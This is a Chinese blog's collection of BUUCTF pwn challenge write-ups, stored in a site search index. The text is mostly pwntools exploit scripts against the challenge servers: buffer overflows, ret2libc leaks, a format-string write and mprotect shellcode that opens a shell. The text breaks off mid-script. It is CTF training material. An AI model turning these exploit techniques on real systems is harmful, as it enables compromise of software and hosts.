<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>buuctf-pwn write-ups (1)</title>
      <link href="/2023/02/28/buuctf-pwn-write-ups-1/"/>
      <url>/2023/02/28/buuctf-pwn-write-ups-1/</url>
      
        <content type="html"><![CDATA[<p><a href="https://buuoj.cn/challenges">BUUCTF网站</a></p><p>笔者认为过于简单的题目会直接附上exp。<br><del>（不得不说buu的题目还挺多的）</del><br>零基础pwn萌新推荐先看这个：<a href="https://www.bilibili.com/video/BV1854y1y7Ro">视频</a></p><h1 id="buu001-test-your-nc"><a href="#buu001-test-your-nc" class="headerlink" title="buu001-test_your_nc"></a>buu001-test_your_nc</h1><p>连上就行</p><h1 id="buu002-rip"><a href="#buu002-rip" class="headerlink" title="buu002-rip"></a>buu002-rip</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn1&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27534</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(cyclic(<span class="number">15</span>) + p64(<span class="number">0x401186</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu003-warmup-csaw-2016"><a href="#buu003-warmup-csaw-2016" class="headerlink" title="buu003-warmup_csaw_2016"></a>buu003-warmup_csaw_2016</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25377</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, cyclic(<span class="number">64</span>+<span class="number">8</span>) + p64(<span class="number">0x40060D</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu004-ciscn-2019-n-1"><a href="#buu004-ciscn-2019-n-1" class="headerlink" title="buu004-ciscn_2019_n_1"></a>buu004-ciscn_2019_n_1</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26735</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Let\&#x27;s guess the number&#x27;</span>, cyclic(<span class="number">44</span>) + p32(<span class="number">0x41348000</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu005-pwn1-sctf-2016"><a href="#buu005-pwn1-sctf-2016" class="headerlink" title="buu005-pwn1_sctf_2016"></a>buu005-pwn1_sctf_2016</h1><p>这道题是一个C++ pwn，但是逻辑不难理解，简单分析一下。下面是IDA反汇编的漏洞函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+1Ch] [ebp-3Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">4</span>]; <span class="comment">// [esp+3Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">7</span>]; <span class="comment">// [esp+40h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+47h] [ebp-11h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">7</span>]; <span class="comment">// [esp+48h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">5</span>]; <span class="comment">// [esp+4Fh] [ebp-9h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Tell me something about yourself: &quot;</span>);</span><br><span class="line">  <span class="built_in">fgets</span>(s, <span class="number">32</span>, edata);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(&amp;input, s);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v5);</span><br><span class="line">  std::string::<span class="built_in">string</span>(v4, <span class="string">&quot;you&quot;</span>, &amp;v5);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(v7);</span><br><span class="line">  std::string::<span class="built_in">string</span>(v6, <span class="string">&quot;I&quot;</span>, v7);</span><br><span class="line">  <span class="built_in">replace</span>((std::string *)v3);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(&amp;input, v3, v6, v4);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v3);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v6);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(v7);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v4);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v5);</span><br><span class="line">  v0 = (<span class="type">const</span> <span class="type">char</span> *)std::string::<span class="built_in">c_str</span>((std::string *)&amp;input);</span><br><span class="line">  <span class="built_in">strcpy</span>(s, v0);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;So, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里重点关注”&#x3D;”和replace函数，这也是程序在栈内存中操作的重点。在调试过程中，那些<code>std::allocator&lt;char&gt;::allocator</code>的语句对栈区没有明显的影响，略过。经过手动反编译，还原出的源代码大致如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">string input;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">vuln</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">char</span> info[<span class="number">32</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Tell me something about yourself: &quot;</span>);</span><br><span class="line"><span class="built_in">fgets</span>(info, <span class="number">32</span>, stdin);</span><br><span class="line">input = info;</span><br><span class="line">string you = <span class="string">&quot;you&quot;</span>;</span><br><span class="line">string I = <span class="string">&quot;I&quot;</span>;</span><br><span class="line">rep = <span class="built_in">replace</span>(input, you, I);<span class="comment">// replace &quot;I&quot; with &quot;you&quot;</span></span><br><span class="line"><span class="built_in">strcpy</span>(info, rep.<span class="built_in">c_str</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">vuln</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数的功能是将info中所有的”I”换成”you”，replace函数甚至都无需分析。由此很容易看出这里有潜在的溢出问题。而且程序本身也给了后门，因此直接修改返回地址即可。<br>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span> * <span class="number">20</span> + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x8048f0d</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu006-jarvisoj-level0"><a href="#buu006-jarvisoj-level0" class="headerlink" title="buu006-jarvisoj_level0"></a>buu006-jarvisoj_level0</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26344</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Hello, World&#x27;</span>, cyclic(<span class="number">128</span>+<span class="number">8</span>) + p64(<span class="number">0x400596</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu007-ciscn-2019-c-1"><a href="#buu007-ciscn-2019-c-1" class="headerlink" title="buu007-ciscn_2019_c_1"></a>buu007-ciscn_2019_c_1</h1><p>常规的获取got表地址，LibcSearcher有的时候可以有的时候不行，题目能给libc是最好的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25958</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/usr/lib/x86_64-linux-gnu/libc-2.33.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">poprdi_ret = <span class="number">0x400c83</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + cyclic(<span class="number">0x50</span>+<span class="number">7</span>)</span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.symbols[<span class="string">b&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your choice!&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)</span><br><span class="line"><span class="built_in">print</span>(io.recv(<span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">put_addr = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(put_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, put_addr)</span><br><span class="line">libc_base = put_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + cyclic(<span class="number">0x50</span>+<span class="number">7</span>)</span><br><span class="line">payload += p64(<span class="number">0x4006b9</span>)<span class="comment"># ret</span></span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(sys_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your choice!&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu008-第五空间2019-决赛-PWN5"><a href="#buu008-第五空间2019-决赛-PWN5" class="headerlink" title="buu008-[第五空间2019 决赛]PWN5"></a>buu008-[第五空间2019 决赛]PWN5</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28577</span>)</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>, &#123;<span class="number">0x804C044</span>: <span class="number">0</span>&#125;)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;your name:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu009-ciscn-2019-n-8"><a href="#buu009-ciscn-2019-n-8" class="headerlink" title="buu009-ciscn_2019_n_8"></a>buu009-ciscn_2019_n_8</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26497</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;What\&#x27;s your name?&#x27;</span>, cyclic(<span class="number">4</span> * <span class="number">13</span>) + p32(<span class="number">17</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu010-jarvisoj-level2"><a href="#buu010-jarvisoj-level2" class="headerlink" title="buu010-jarvisoj_level2"></a>buu010-jarvisoj_level2</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29788</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x804a024</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input:&#x27;</span>, cyclic(<span class="number">0x88</span>) + p32(elf.symbols[<span class="string">&#x27;main&#x27;</span>]) + p32(elf.plt[<span class="string">&#x27;system&#x27;</span>]) + p32(binsh_addr) + p32(binsh_addr))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu011-OGeek2019-babyrop"><a href="#buu011-OGeek2019-babyrop" class="headerlink" title="buu011-[OGeek2019]babyrop"></a>buu011-[OGeek2019]babyrop</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27628</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">exp = <span class="number">0x8048825</span></span><br><span class="line">ret = <span class="number">0x8048502</span></span><br><span class="line"></span><br><span class="line">io.send(<span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xFF&#x27;</span> * <span class="number">0x1f</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0xe7</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p32(exp)</span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Correct\n&#x27;</span>, payload)</span><br><span class="line">io.send(<span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xFF&#x27;</span> * <span class="number">0x1f</span>)</span><br><span class="line">read = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">base = read - libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">sys = base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0xe7</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(sys)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Correct\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu012-bjdctf-2020-babystack"><a href="#buu012-bjdctf-2020-babystack" class="headerlink" title="buu012-bjdctf_2020_babystack"></a>buu012-bjdctf_2020_babystack</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27538</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;length of your name:&#x27;</span>, <span class="string">b&#x27;1000&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;What\&#x27;s u name?&#x27;</span>, cyclic(<span class="number">0x10</span> + <span class="number">8</span>) + p64(elf.symbols[<span class="string">&#x27;backdoor&#x27;</span>]))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu013-get-started-3dsctf-2016"><a href="#buu013-get-started-3dsctf-2016" class="headerlink" title="buu013-get_started_3dsctf_2016"></a>buu013-get_started_3dsctf_2016</h1><p>不知道为什么3dsctf里面不止一道题在挂exp脚本调试的时候recv收不到一开始发送的字符串，很奇怪，本来这一题直接返回到后门就好了，但是因为这个怪原因不得不用mprotect在其他地方再写一个shell，原来程序里面的后门就没用上 <del>（屑）</del><br>使用mprotect函数时传入的地址参数必须页对齐，size参数也必须是页的整数倍。权限填7表示可读可写可执行。本题中要修改的主要是下面这个页的属性，然后shellcode写在.got.plt段中，尝试修改bss段，写在bss段发现不行，可能是bss段中有一些重要数据之类。</p><p><img src="/2023/02/28/buuctf-pwn-write-ups-1/1.png"></p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29364</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">mprotect = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">start = <span class="number">0x80eb000</span></span><br><span class="line">length = <span class="number">0x1000</span></span><br><span class="line">bss = <span class="number">0x803bf80</span></span><br><span class="line">pop3 = <span class="number">0x0809e4c5</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x38</span>)</span><br><span class="line">payload += p32(mprotect)</span><br><span class="line">payload += p32(pop3)</span><br><span class="line">payload += p32(start)</span><br><span class="line">payload += p32(length)</span><br><span class="line">payload += p32(<span class="number">7</span>)</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p32(pop3)</span><br><span class="line">payload += p32(<span class="number">0</span>)<span class="comment"># stdin</span></span><br><span class="line">payload += p32(start)</span><br><span class="line">payload += p32(<span class="number">0x80</span>)</span><br><span class="line">payload += p32(start)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line">io.sendline(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu014-ciscn-2019-en-2"><a href="#buu014-ciscn-2019-en-2" class="headerlink" title="buu014-ciscn_2019_en_2"></a>buu014-ciscn_2019_en_2</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25743</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/usr/lib/x86_64-linux-gnu/libc-2.33.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">poprdi_ret = <span class="number">0x400c83</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + cyclic(<span class="number">0x50</span>+<span class="number">7</span>)</span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.symbols[<span class="string">b&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your choice!&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)</span><br><span class="line"><span class="built_in">print</span>(io.recv(<span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">put_addr = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(put_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, put_addr)</span><br><span class="line">libc_base = put_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + 